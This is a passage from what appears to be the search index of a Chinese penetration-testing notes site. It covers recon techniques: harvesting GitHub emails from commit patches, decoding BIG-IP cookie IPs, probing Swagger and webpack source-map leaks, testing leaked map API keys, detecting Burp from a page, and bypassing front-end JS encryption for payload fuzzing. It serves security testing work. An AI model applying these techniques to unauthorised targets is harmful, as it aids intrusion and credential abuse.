1.\u901a\u8fc7\u62a5\u9519\uff0c\u62a5\u51fa\u7ec4\u4ef6\u4fe1\u606f\u6765\u5224\u65ad","title":"\u5224\u65ad\u7ec4\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/#_1","text":"","title":"\u5224\u65ad\u7ec4\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/#jacksonfastjson","text":"1.\u901a\u8fc7\u62a5\u9519\uff0c\u62a5\u51fa\u7ec4\u4ef6\u4fe1\u606f\u6765\u5224\u65ad","title":"\u5224\u65ad\u76ee\u6807\u73af\u5883\u662fjackson\u8fd8\u662ffastjson"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/","text":"\u4fe1\u606f\u641c\u96c6trick \u76ee\u5f55 github \u6cc4\u6f0f\u90ae\u7bb1 github \u6cc4\u6f0f\u90ae\u7bb1 \u5b9a\u4f4d\u4e00\u4e2a\u7528\u6237 \u968f\u4fbf\u70b9\u8fdb\u4ed6\u4e00\u4e2a\u9879\u76ee\uff0c\u7136\u540e\u70b9commit\u8bb0\u5f55 \u5728url\u672b\u5c3e\u6dfb\u52a0.patch \u83b7\u5f97\u90ae\u7bb1 \u9632\u6b62\u6cc4\u6f0f\uff1a","title":"\u4fe1\u606f\u641c\u96c6trick"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/#trick","text":"","title":"\u4fe1\u606f\u641c\u96c6trick"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/#_1","text":"github \u6cc4\u6f0f\u90ae\u7bb1","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86trick/#github","text":"\u5b9a\u4f4d\u4e00\u4e2a\u7528\u6237 \u968f\u4fbf\u70b9\u8fdb\u4ed6\u4e00\u4e2a\u9879\u76ee\uff0c\u7136\u540e\u70b9commit\u8bb0\u5f55 \u5728url\u672b\u5c3e\u6dfb\u52a0.patch \u83b7\u5f97\u90ae\u7bb1 \u9632\u6b62\u6cc4\u6f0f\uff1a","title":"github \u6cc4\u6f0f\u90ae\u7bb1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u4fe1\u606f\u6cc4\u9732 \u76ee\u5f55 BIGIP f5 \u6cc4\u6f0f\u771f\u5b9eip druid swagger webpack \u5730\u56fekey\u6cc4\u6f0f BIGIP f5 \u6cc4\u6f0f\u771f\u5b9eip \u54cd\u5e94\u5305\u7684set-cookie\u5904\u53ef\u80fd\u4f1a\u6cc4\u6f0fip set-cookie: BIGipServerPOOL_web=182354092.20480.0000 exp: https://github.com/sgtalpha/BigIPCookie python ipCookie.py -c 574728384.20480.0000 druid swagger swagger \u4f1a\u6cc4\u6f0fapi\uff0c\u53ef\u4ee5\u6c34\u6c34report\u6216\u8005\u628aapi\u62ff\u7740\u63a5\u7740\u6d4b /v1/swagger.json /v2/swagger.json /v2/api-docs webpack \u5927\u90e8\u5206Vue\u7b49\u5e94\u7528\u9879\u76ee\u4f1a\u4f7f\u7528Webpack\u8fdb\u884c\u6253\u5305\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u786e\u914d\u7f6e\uff0c\u5c31\u4f1a\u5bfc\u81f4\u9879\u76ee\u6e90\u7801\u6cc4\u9732\uff0c\u53ef\u80fd\u6cc4\u9732\u7684\u5404\u79cd\u4fe1\u606f\u5982API\u3001\u52a0\u5bc6\u7b97\u6cd5\u3001\u7ba1\u7406\u5458\u90ae\u7bb1\u3001\u5185\u90e8\u529f\u80fd\u7b49\u7b49\u3002 \u53ef\u4ee5\u6c34\u6c34report Webpack\u9879\u76ee\u6e90\u7801\u5728\u6cc4\u6f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u4e2d\u7684Sources\u2014> Page\u2014> Webpack://\u4e2d\u67e5\u770b\u6e90\u4ee3\u7801\u3002 \u4f7f\u7528Webpack\u6253\u5305\u5e94\u7528\u7a0b\u5e8f\u4f1a\u5728\u7f51\u7ad9js\u540c\u76ee\u5f55\u4e0b\u751f\u6210js.map\u6587\u4ef6\u3002 \u5728JavaScript\u4e0a\u7ebf\u4e4b\u524d\uff0c\u901a\u5e38\u4f1a\u8fdb\u884c\u4ee3\u7801\u538b\u7f29\u548c\u6df7\u6dc6\uff0c\u4ee5\u589e\u52a0\u4ee3\u7801\u7684\u5b89\u5168\u6027\u548c\u51cf\u5c11\u4ee3\u7801\u7684\u5927\u5c0f\u3002\u4ee3\u7801\u538b\u7f29\u4f1a\u5220\u9664\u4e0d\u5fc5\u8981\u7684\u7a7a\u683c\u3001\u6362\u884c\u7b26\u548c\u6ce8\u91ca\uff0c\u4ece\u800c\u51cf\u5c0f\u6587\u4ef6\u5927\u5c0f\u3002\u4ee3\u7801\u6df7\u6dc6\u5219\u4f1a\u5c06\u53d8\u91cf\u540d\u3001\u51fd\u6570\u540d\u548c\u5176\u4ed6\u6807\u8bc6\u7b26\u91cd\u547d\u540d\u4e3a\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u4f7f\u4ee3\u7801\u66f4\u96be\u4ee5\u7406\u89e3\u548c\u9006\u5411\u5de5\u7a0b\u3002 .map\u6587\u4ef6\u7684\u4f5c\u7528\uff1a\u9879\u76ee\u6253\u5305\u540e\uff0c\u4ee3\u7801\u90fd\u662f\u7ecf\u8fc7\u538b\u7f29\u52a0\u5bc6\u7684\uff0c\u5982\u679c\u8fd0\u884c\u65f6\u62a5\u9519\uff0c\u8f93\u51fa\u7684\u9519\u8bef\u4fe1\u606f\u65e0\u6cd5\u51c6\u786e\u5f97\u77e5\u662f\u54ea\u91cc\u7684\u4ee3\u7801\u62a5\u9519\u3002 \u6709\u4e86map\u5c31\u53ef\u4ee5\u50cf\u672a\u52a0\u5bc6\u7684\u4ee3\u7801\u4e00\u6837\uff0c\u51c6\u786e\u7684\u8f93\u51fa\u662f\u54ea\u4e00\u884c\u54ea\u4e00\u5217\u6709\u9519\u3002 \u76f4\u63a5\u67e5\u770b\u7f51\u7ad9\u7684js\u6587\u4ef6\uff0c\u53ef\u4ee5\u5728\u672b\u5c3e\u5904\u6709js.map\u6587\u4ef6\u540d\u3002 \u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u83b7\u5f97\u6e90\u7801 \u63d2\u4ef6chrome git clone https://github.com/LuckyZmj/SourceDetector-dist \u6253\u5f00\u8c37\u6b4c\u6d4f\u89c8\u5668\u6269\u5c55\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u52a0\u8f7d\u5df2\u89e3\u538b\u7684\u6269\u5c55\u7a0b\u5e8f\uff0c\u9009\u4e2d\u63d2\u4ef6\u9879\u76ee\u4e2d\u7684dist\u76ee\u5f55\u5373\u53ef\u5b89\u88c5\u63d2\u4ef6\u3002 \u5730\u56fekey\u6cc4\u6f0f \u7f51\u5740\u4e2d\u53ef\u80fd\u4f1a\u6cc4\u6f0f\u5404\u5927\u7f51\u7edc\u5730\u56feapi\u7684key\u503c\u3002 \u6d4b\u8bd5key\u53ef\u7528\u6027\u7684url\u5982\u4e0b \u9ad8\u5fb7webapi\uff1a https://restapi.amap.com/v3/direction/walking?origin=116.434307,39.90909\\&destination=116.434446,39.90816\\&key= \u8fd9\u91cc\u5199key \u9ad8\u5fb7jsapi\uff1a https://restapi.amap.com/v3/geocode/regeo?key= \u8fd9\u91cc\u5199key \\&s=rsv3\\&location=116.434446,39.90816\\&callback=jsonp_258885_\\&platform=JS \u9ad8\u5fb7\u5c0f\u7a0b\u5e8f\u5b9a\u4f4d\uff1a https://restapi.amap.com/v3/geocode/regeo?key= \u8fd9\u91cc\u5199key \\&location=117.19674%2C39.14784\\&extensions=all\\&s=rsx\\&platform=WXJS\\&appname=c589cf63f592ac13bcab35f8cd18f495\\&sdkversion=1.2.0\\&logversion=2.0 \u767e\u5ea6webapi\uff1a https://api.map.baidu.com/place/v2/search?query=ATM\u673a\\&tag=\u94f6\u884c\\&region=\u5317\u4eac\\&output=json\\&ak= \u8fd9\u91cc\u5199key \u767e\u5ea6webapiIOS\u7248\uff1a https://api.map.baidu.com/place/v2/search?query=ATM\u673a\\&tag=\u94f6\u884c\\&region=\u5317\u4eac\\&output=json\\&ak= \u8fd9\u91cc\u5199key =iPhone7%2C2\\&mcode=com.didapinche.taxi\\&os=12.5.6 \u817e\u8bafwebapi\uff1a https://apis.map.qq.com/ws/place/v1/search?keyword=\u9152\u5e97\\&boundary=nearby(39.908491,116.374328,1000)\\&key= \u8fd9\u91cc\u5199key","title":"\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_1","text":"","title":"\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_2","text":"BIGIP f5 \u6cc4\u6f0f\u771f\u5b9eip druid swagger webpack \u5730\u56fekey\u6cc4\u6f0f","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#bigip-f5-ip","text":"\u54cd\u5e94\u5305\u7684set-cookie\u5904\u53ef\u80fd\u4f1a\u6cc4\u6f0fip set-cookie: BIGipServerPOOL_web=182354092.20480.0000 exp: https://github.com/sgtalpha/BigIPCookie python ipCookie.py -c 574728384.20480.0000","title":"BIGIP f5 \u6cc4\u6f0f\u771f\u5b9eip"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#druid","text":"","title":"druid"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#swagger","text":"swagger \u4f1a\u6cc4\u6f0fapi\uff0c\u53ef\u4ee5\u6c34\u6c34report\u6216\u8005\u628aapi\u62ff\u7740\u63a5\u7740\u6d4b /v1/swagger.json /v2/swagger.json /v2/api-docs","title":"swagger"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#webpack","text":"\u5927\u90e8\u5206Vue\u7b49\u5e94\u7528\u9879\u76ee\u4f1a\u4f7f\u7528Webpack\u8fdb\u884c\u6253\u5305\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u786e\u914d\u7f6e\uff0c\u5c31\u4f1a\u5bfc\u81f4\u9879\u76ee\u6e90\u7801\u6cc4\u9732\uff0c\u53ef\u80fd\u6cc4\u9732\u7684\u5404\u79cd\u4fe1\u606f\u5982API\u3001\u52a0\u5bc6\u7b97\u6cd5\u3001\u7ba1\u7406\u5458\u90ae\u7bb1\u3001\u5185\u90e8\u529f\u80fd\u7b49\u7b49\u3002 \u53ef\u4ee5\u6c34\u6c34report Webpack\u9879\u76ee\u6e90\u7801\u5728\u6cc4\u6f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u4e2d\u7684Sources\u2014> Page\u2014> Webpack://\u4e2d\u67e5\u770b\u6e90\u4ee3\u7801\u3002 \u4f7f\u7528Webpack\u6253\u5305\u5e94\u7528\u7a0b\u5e8f\u4f1a\u5728\u7f51\u7ad9js\u540c\u76ee\u5f55\u4e0b\u751f\u6210js.map\u6587\u4ef6\u3002 \u5728JavaScript\u4e0a\u7ebf\u4e4b\u524d\uff0c\u901a\u5e38\u4f1a\u8fdb\u884c\u4ee3\u7801\u538b\u7f29\u548c\u6df7\u6dc6\uff0c\u4ee5\u589e\u52a0\u4ee3\u7801\u7684\u5b89\u5168\u6027\u548c\u51cf\u5c11\u4ee3\u7801\u7684\u5927\u5c0f\u3002\u4ee3\u7801\u538b\u7f29\u4f1a\u5220\u9664\u4e0d\u5fc5\u8981\u7684\u7a7a\u683c\u3001\u6362\u884c\u7b26\u548c\u6ce8\u91ca\uff0c\u4ece\u800c\u51cf\u5c0f\u6587\u4ef6\u5927\u5c0f\u3002\u4ee3\u7801\u6df7\u6dc6\u5219\u4f1a\u5c06\u53d8\u91cf\u540d\u3001\u51fd\u6570\u540d\u548c\u5176\u4ed6\u6807\u8bc6\u7b26\u91cd\u547d\u540d\u4e3a\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u4f7f\u4ee3\u7801\u66f4\u96be\u4ee5\u7406\u89e3\u548c\u9006\u5411\u5de5\u7a0b\u3002 .map\u6587\u4ef6\u7684\u4f5c\u7528\uff1a\u9879\u76ee\u6253\u5305\u540e\uff0c\u4ee3\u7801\u90fd\u662f\u7ecf\u8fc7\u538b\u7f29\u52a0\u5bc6\u7684\uff0c\u5982\u679c\u8fd0\u884c\u65f6\u62a5\u9519\uff0c\u8f93\u51fa\u7684\u9519\u8bef\u4fe1\u606f\u65e0\u6cd5\u51c6\u786e\u5f97\u77e5\u662f\u54ea\u91cc\u7684\u4ee3\u7801\u62a5\u9519\u3002 \u6709\u4e86map\u5c31\u53ef\u4ee5\u50cf\u672a\u52a0\u5bc6\u7684\u4ee3\u7801\u4e00\u6837\uff0c\u51c6\u786e\u7684\u8f93\u51fa\u662f\u54ea\u4e00\u884c\u54ea\u4e00\u5217\u6709\u9519\u3002 \u76f4\u63a5\u67e5\u770b\u7f51\u7ad9\u7684js\u6587\u4ef6\uff0c\u53ef\u4ee5\u5728\u672b\u5c3e\u5904\u6709js.map\u6587\u4ef6\u540d\u3002 \u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u83b7\u5f97\u6e90\u7801 \u63d2\u4ef6chrome git clone https://github.com/LuckyZmj/SourceDetector-dist \u6253\u5f00\u8c37\u6b4c\u6d4f\u89c8\u5668\u6269\u5c55\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u6a21\u5f0f\uff0c\u52a0\u8f7d\u5df2\u89e3\u538b\u7684\u6269\u5c55\u7a0b\u5e8f\uff0c\u9009\u4e2d\u63d2\u4ef6\u9879\u76ee\u4e2d\u7684dist\u76ee\u5f55\u5373\u53ef\u5b89\u88c5\u63d2\u4ef6\u3002","title":"webpack"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#key","text":"\u7f51\u5740\u4e2d\u53ef\u80fd\u4f1a\u6cc4\u6f0f\u5404\u5927\u7f51\u7edc\u5730\u56feapi\u7684key\u503c\u3002 \u6d4b\u8bd5key\u53ef\u7528\u6027\u7684url\u5982\u4e0b \u9ad8\u5fb7webapi\uff1a https://restapi.amap.com/v3/direction/walking?origin=116.434307,39.90909\\&destination=116.434446,39.90816\\&key= \u8fd9\u91cc\u5199key \u9ad8\u5fb7jsapi\uff1a https://restapi.amap.com/v3/geocode/regeo?key= \u8fd9\u91cc\u5199key \\&s=rsv3\\&location=116.434446,39.90816\\&callback=jsonp_258885_\\&platform=JS \u9ad8\u5fb7\u5c0f\u7a0b\u5e8f\u5b9a\u4f4d\uff1a https://restapi.amap.com/v3/geocode/regeo?key= \u8fd9\u91cc\u5199key \\&location=117.19674%2C39.14784\\&extensions=all\\&s=rsx\\&platform=WXJS\\&appname=c589cf63f592ac13bcab35f8cd18f495\\&sdkversion=1.2.0\\&logversion=2.0 \u767e\u5ea6webapi\uff1a https://api.map.baidu.com/place/v2/search?query=ATM\u673a\\&tag=\u94f6\u884c\\&region=\u5317\u4eac\\&output=json\\&ak= \u8fd9\u91cc\u5199key \u767e\u5ea6webapiIOS\u7248\uff1a https://api.map.baidu.com/place/v2/search?query=ATM\u673a\\&tag=\u94f6\u884c\\&region=\u5317\u4eac\\&output=json\\&ak= \u8fd9\u91cc\u5199key =iPhone7%2C2\\&mcode=com.didapinche.taxi\\&os=12.5.6 \u817e\u8bafwebapi\uff1a https://apis.map.qq.com/ws/place/v1/search?keyword=\u9152\u5e97\\&boundary=nearby(39.908491,116.374328,1000)\\&key= \u8fd9\u91cc\u5199key","title":"\u5730\u56fekey\u6cc4\u6f0f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%AF%B9%E6%8A%97/","text":"\u5bf9\u6297 burp\u68c0\u6d4b js\u524d\u7aef\u52a0\u5bc6 \u547d\u4ee4\u6ce8\u5165","title":"\u5bf9\u6297"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%AF%B9%E6%8A%97/#_1","text":"burp\u68c0\u6d4b js\u524d\u7aef\u52a0\u5bc6 \u547d\u4ee4\u6ce8\u5165","title":"\u5bf9\u6297"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/","text":"burp\u68c0\u6d4b \u76ee\u5f55 \u68c0\u6d4b\u4ee3\u7406\u7aef\u53e3 \u68c0\u6d4btls \u68c0\u6d4bwebsocket \u5957\u4e0a\u5c42\u4ee3\u7406 \u6362\u8bc1\u4e66 \u7528yakit \u68c0\u6d4b\u4ee3\u7406\u7aef\u53e3 \u524d\u7aef\u8bf7\u6c42\u672c\u57308080\u7aef\u53e3\u67e5\u770b\u662f\u5426\u5b58\u5728 <h2 id='indicator'>Loading...</h2> <script> function burp_found() { let e = document.getElementById('indicator'); e.innerText = 'Burp FOUND !!!'; } function burp_not_found() { let e = document.getElementById('indicator'); e.innerText = 'Burp not found.'; } </script> <img style=\"display: none;\" src='http://burp/favicon.ico' onload='burp_found()' onerror='burp_not_found()'/> \u542f\u7528\u8fd9\u4e24\u4e2a\u9009\u9879 \u68c0\u6d4btls \u68c0\u6d4bwebsocket \u5957\u4e0a\u5c42\u4ee3\u7406 \u6362\u8bc1\u4e66 \u7528yakit","title":"burp\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#burp","text":"","title":"burp\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#_1","text":"\u68c0\u6d4b\u4ee3\u7406\u7aef\u53e3 \u68c0\u6d4btls \u68c0\u6d4bwebsocket \u5957\u4e0a\u5c42\u4ee3\u7406 \u6362\u8bc1\u4e66 \u7528yakit","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#_2","text":"\u524d\u7aef\u8bf7\u6c42\u672c\u57308080\u7aef\u53e3\u67e5\u770b\u662f\u5426\u5b58\u5728 <h2 id='indicator'>Loading...</h2> <script> function burp_found() { let e = document.getElementById('indicator'); e.innerText = 'Burp FOUND !!!'; } function burp_not_found() { let e = document.getElementById('indicator'); e.innerText = 'Burp not found.'; } </script> <img style=\"display: none;\" src='http://burp/favicon.ico' onload='burp_found()' onerror='burp_not_found()'/> \u542f\u7528\u8fd9\u4e24\u4e2a\u9009\u9879","title":"\u68c0\u6d4b\u4ee3\u7406\u7aef\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#tls","text":"","title":"\u68c0\u6d4btls"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#websocket","text":"","title":"\u68c0\u6d4bwebsocket"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#_3","text":"","title":"\u5957\u4e0a\u5c42\u4ee3\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#_4","text":"","title":"\u6362\u8bc1\u4e66"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/burp%E6%A3%80%E6%B5%8B/burp%E6%A3%80%E6%B5%8B/#yakit","text":"","title":"\u7528yakit"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/","text":"js\u524d\u7aef\u52a0\u5bc6 \u76ee\u5f55 \u5927\u6b65\u9aa4 \u5927\u6b65\u9aa4 1.\u901a\u8fc7F12\u5b9a\u4f4d\u5230js\u52a0\u5bc6\u7684\u5730\u65b9\uff0c\u7136\u540e\u628ajs\u638f\u51fa\u6765\u3002 2.\u638f\u51fa\u6765\u7684js\u6539\u4e00\u6539\uff0c\u7136\u540e\u7528node\u770b\u80fd\u4e0d\u80fd\u6b63\u5e38\u8dd1\u8d77\u6765\uff0c\u8dd1\u8d77\u6765\u7684\u5bc6\u6587\u5bf9\u4e0d\u5bf9 3.\u4f7f\u7528burp\u7684\u8fd9\u4e2a\u63d2\u4ef6 https://github.com/c0ny1/jsEncrypter/tree/0.3.2 \u628ajs\u6309\u7167\u683c\u5f0f\u586b\u597d \u52a0\u5bc6\u811a\u672cjs\u8bb0\u5f97\u7528export\u5bfc\u51fa\u52a0\u5bc6\u51fd\u6570 4.\u6267\u884c\u8fd9\u4e2ajs\u6587\u4ef6 5.\u7136\u540eburp\u91ccpayload processing\u9009 Invoke Burp extension\u5373\u53ef","title":"js\u524d\u7aef\u52a0\u5bc6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/#js","text":"","title":"js\u524d\u7aef\u52a0\u5bc6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/#_1","text":"\u5927\u6b65\u9aa4","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/#_2","text":"1.\u901a\u8fc7F12\u5b9a\u4f4d\u5230js\u52a0\u5bc6\u7684\u5730\u65b9\uff0c\u7136\u540e\u628ajs\u638f\u51fa\u6765\u3002 2.\u638f\u51fa\u6765\u7684js\u6539\u4e00\u6539\uff0c\u7136\u540e\u7528node\u770b\u80fd\u4e0d\u80fd\u6b63\u5e38\u8dd1\u8d77\u6765\uff0c\u8dd1\u8d77\u6765\u7684\u5bc6\u6587\u5bf9\u4e0d\u5bf9 3.\u4f7f\u7528burp\u7684\u8fd9\u4e2a\u63d2\u4ef6 https://github.com/c0ny1/jsEncrypter/tree/0.3.2 \u628ajs\u6309\u7167\u683c\u5f0f\u586b\u597d \u52a0\u5bc6\u811a\u672cjs\u8bb0\u5f97\u7528export\u5bfc\u51fa\u52a0\u5bc6\u51fd\u6570 4.\u6267\u884c\u8fd9\u4e2ajs\u6587\u4ef6 5.\u7136\u540eburp\u91ccpayload processing\u9009 Invoke Burp 